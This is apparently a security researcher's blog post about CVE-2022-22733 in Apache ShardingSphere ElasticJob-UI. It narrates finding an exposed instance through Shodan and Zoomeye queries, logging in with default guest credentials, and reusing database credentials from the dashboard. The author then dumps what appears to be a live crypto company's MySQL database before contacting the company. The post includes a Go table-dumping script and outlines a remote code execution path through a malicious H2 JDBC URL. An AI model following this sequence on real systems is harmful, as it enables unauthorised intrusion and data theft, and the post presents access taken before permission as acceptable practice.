---
title: "CVE Analysis: Hacking a Crypto Network for $$$$"
classes: wide
header:
  teaser: /assets/images/crypto.png
ribbon: green
description: "How Analyzing a simple CVE led me to takeover a Crypto Network."
categories:
  - General
tags:
  - General
  - pentest
  - pentesting
  - web3
  - JDBC
  - bypass
  - mysql
  - exploitation
  - wallet
  - cve
  - java
  - apache
toc: true
---

# Introduction

Welcome, everyone. In this blog post, I will share the story of how, in June 2023, I successfully dumped the database of a crypto network, ultimately leading to the ability to achieve remote code execution. This was accomplished during my research and analysis of a CVE affecting one of Apache's products.

# About the CVE

`CVE-2022-22733` is a critical security vulnerability affecting Apache ShardingSphere ElasticJob-UI, particularly in versions `3.0.0` and earlier. The vulnerability occurs within the `UserAuthenticationService` class, where the `getToken()` method returns a `Base64` encoded string representing the entire `UserAuthenticationService` object. This encoded token includes sensitive information such as the `root` and `guest` usernames & passwords. Which when we  decode it, We can find the `root` credentials, Which Allows to escalate privileges to the highest level within the application. You can read the full analysis from [here](https://zeyadazima.com/vulnerability/cve%20analysis/CVE_2022_22733/).

![image](https://github.com/user-attachments/assets/417cea0e-5452-4d92-90da-b3b3f29f5d57)


# Identify Targets

When identifying targets that use a particular product vulnerable to an exploit, internet search engines are invaluable tools. They help us locate instances of the application running online, enabling us to test our exploit.

## Search Engines

For this task, I utilized `Shodan` and `Zoomeye`. Although I didn't find many targets, I encountered a recurring target in both `Shodan` and `Zoomeye`:

- **Zoomeye**:

![image](https://github.com/user-attachments/assets/9ca7ed99-0398-47ee-a7e7-dfa3cc25f42d)

- **Shodan**:

![image](https://github.com/user-attachments/assets/a97caafd-4579-4207-ae04-3c482106898d)


> **Query Used**: `title:"ShardingSphere"`


# Exploit the CVE

After identifying a target, the first step was to log in using the guest account (`guest:guest`):

![IFu8FVvrjhyMLZCrdXgYZA5BUdUoJRzwwCSPF0ry](https://github.com/user-attachments/assets/1142a2ea-0ff4-41b4-a945-74dac524c407)


Login was successful!

## Credentials on the Dashboard

Before doing anything else, I explored the configurations accessible with the guest account. I wanted to check if the target was vulnerable and gain a complete understanding of the setup. While navigating the `Event Trace` data source tab, I discovered a `MYSQL` database data source, complete with the username and password:

![image](https://github.com/user-attachments/assets/3fa471f1-f440-450d-ade4-726e16e92813)

I tested these credentials and was able to connect to the database successfully.

## Dump the Database

Once connected to the `MYSQL` database, I proceeded to dump the tables to examine the data:

![image](https://github.com/user-attachments/assets/adfa31f0-f204-4b64-9d85-0497dbdfe6e6)

From the data, I identified information that allowed me to contact the company. I informed them of the vulnerability, as I realized I could manipulate the data. In response, they launched a bug bounty program on one of the `Web3` platforms.

I showed them a `go` code, Which I wrote to dump the whole database:

```go
package main

import (
	"database/sql"
	"fmt"
	"os"
	"time"

	_ "github.com/go-sql-driver/mysql"
)

const (
	hostname     = "server_ip"
	username     = "username"
	password     = "password"
	databaseName = "datyabase"
)

var tablesToDump = []string{
	"tables...."
}

func main() {
	db, err := sql.Open("mysql", fmt.Sprintf("%s:%s@tcp(%s)/%s", username, password, hostname, databaseName))
	if err != nil {
		fmt.Printf("Error connecting to MySQL server: %v\n", err)
		return
	}
	defer db.Close()

	backupDir := "backup"
	if _, err := os.Stat(backupDir); os.IsNotExist(err) {
		os.Mkdir(backupDir, 0755)
	}


	timestamp := time.Now().Format("2006-01-02_15-04-05")


	for _, table := range tablesToDump {
		backupFile := fmt.Sprintf("%s/%s_%s.txt", backupDir, table, timestamp)


		file, err := os.Create(backupFile)
		if err != nil {
			fmt.Printf("Error creating backup file for table %s: %v\n", table, err)
			continue
		}
		defer file.Close()

		rows, err := db.Query(fmt.Sprintf("SELECT * FROM %s", table))
		if err != nil {
			fmt.Printf("Error executing query for table %s: %v\n", table, err)
			continue
		}
		defer rows.Close()

		for rows.Next() {
			columns, err := rows.Columns()
			if err != nil {
				fmt.Printf("Error retrieving column names for table %s: %v\n", table, err)
				break
			}

			values := make([]interface{}, len(columns))
			columnPointers := make([]interface{}, len(columns))
			for i := range values {
				columnPointers[i] = &values[i]
			}

			err = rows.Scan(columnPointers...)
			if err != nil {
				fmt.Printf("Error scanning row data for table %s: %v\n", table, err)
				break
			}

			rowData := make([]string, len(columns))
			for i, v := range values {
				if v != nil {
					byteValue, ok := v.([]byte)
					if ok {
						rowData[i] = string(byteValue)
					} else {
						rowData[i] = fmt.Sprintf("%v", v)
					}
				}
			}

			_, err = file.WriteString(fmt.Sprintf("%s\n", rowData))
			if err != nil {
				fmt.Printf("Error writing row data for table %s: %v\n", table, err)
				break
			}
		}

		fmt.Printf("Backup created for table %s: %s\n", table, backupFile)
	}

	fmt.Println("Backup completed for all specified tables")
}
```

> **Note**: Always inform the company before taking any further steps. Unauthorized actions are unethical and potentially illegal.


# Going Further

In CVE-2022-22733, after obtaining root credentials through an initial privilege escalation vulnerability, You can exploit the `JDBC` interface to achieve Remote Code Execution (`RCE`). By Configuring a malicious data source using the `H2` database driver, crafting a `JDBC` URL that points to a script hosted on a remote server. This `URL` includes commands to execute the script upon database initialization. The script, often containing commands to exploit the system’s shell (like running `calc.exe`), is executed when the connection is tested, leading to full `RCE` on the target server. But As It's aganist law cause we can't perform any actions like that, But we still have the ability to go into the server.


![image](https://github.com/user-attachments/assets/58e1be44-9f9b-4799-856c-23a3427ebdb3)



> You ca Read my exploitation part from the analysis for more information from [here](https://zeyadazima.com/vulnerability/cve%20analysis/CVE_2022_22733_exploit/).



# Conclusion

![image](https://github.com/user-attachments/assets/e6bb7b9c-b736-422a-9afa-2000dda8aead)


By exploiting this vulnerability, I was able to gain access and subsequently connect to the target's database. After successfully dumping the database, I responsibly disclosed the findings to the company, leading to the initiation of a bug bounty program on a `Web3` platform. Although through the `JDBC` interface, it can be abused, Which could lead to Remote Code Execution (`RCE`).
